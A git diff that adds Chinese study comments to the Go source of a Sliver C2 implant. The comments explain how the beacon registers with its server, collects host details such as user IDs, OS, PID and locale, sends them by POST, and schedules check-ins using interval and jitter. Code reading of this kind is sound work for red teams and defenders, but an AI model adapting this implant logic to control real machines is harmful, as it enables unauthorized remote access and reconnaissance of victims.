@@ -257,7 +257,7 @@ func sessionStartup() {
 // {{if .Config.IsBeacon}}
 func beaconMainLoop(beacon *transports.Beacon) error {
 	// Register beacon
-	//
+	// httpbeacon: 发送第一次请求，并获得到SessionID
 	err := beacon.Init()
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -274,6 +274,7 @@ func beaconMainLoop(beacon *transports.Beacon) error {
 		}
 	}()
 
+	// httpbeacon: 没有Start()
 	err = beacon.Start()
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -285,22 +286,27 @@ func beaconMainLoop(beacon *transports.Beacon) error {
 		}
 		return nil
 	}
+	// 成功连接一次，Error次数就置零
 	connectionErrors = 0
 	// {{if .Config.Debug}}
 	log.Printf("Registering beacon with server")
 	// {{end}}
+	// 拿到间隔时间+抖动时间，从而得到下一次的上线时间
 	nextCheckin := time.Now().Add(beacon.Duration())
+	// 获取主机信息
 	register := registerSliver()
 	register.ActiveC2 = beacon.ActiveC2
 	register.ProxyURL = beacon.ProxyURL
+	// httpbeacon: 发送Post请求，将Beacon信息回传
 	beacon.Send(wrapEnvelope(sliverpb.MsgBeaconRegister, &sliverpb.BeaconRegister{
-		ID:          InstanceID,
+		ID:          InstanceID, //uuid
 		Interval:    beacon.Interval(),
 		Jitter:      beacon.Jitter(),
-		Register:    register,
-		NextCheckin: int64(beacon.Duration().Seconds()),
+		Register:    register,                           // 主机信息中也有一个UUID
+		NextCheckin: int64(beacon.Duration().Seconds()), // 下次回连的间隔秒数 .Seconds()将时间转换为秒
 	}))
 	time.Sleep(time.Second)
+	// httpbeacon: 没有Close()
 	beacon.Close()
 
 	// BeaconMain - Is executed in it's own goroutine as the function will block
@@ -641,6 +647,7 @@ func sessionMainLoop(connection *transports.Connection) error {
 }
 
 // Envelope - Creates an envelope with the given type and data.
+// 转换结构，消息类型+消息内容(序列化后的)
 func wrapEnvelope(msgType uint32, message protoreflect.ProtoMessage) *sliverpb.Envelope {
 	data, err := proto.Marshal(message)
 	if err != nil {
@@ -704,13 +711,13 @@ func registerSliver() *sliverpb.Register {
 		Uid:               currentUser.Uid,
 		Gid:               currentUser.Gid,
 		Os:                runtime.GOOS,
-		Version:           version.GetVersion(),
+		Version:           version.GetVersion(), // 获取操作系统信息
 		Arch:              runtime.GOARCH,
 		Pid:               int32(os.Getpid()),
 		Filename:          filename,
-		ReconnectInterval: int64(transports.GetReconnectInterval()),
+		ReconnectInterval: int64(transports.GetReconnectInterval()), // 默认的回连间隔
 		ConfigID:          "{{ .Config.ID }}",
-		PeerID:            pivots.MyPeerID,
-		Locale:            locale.GetLocale(),
+		PeerID:            pivots.MyPeerID,    // 与内网互联有关
+		Locale:            locale.GetLocale(), // 获取语言
 	}
 }
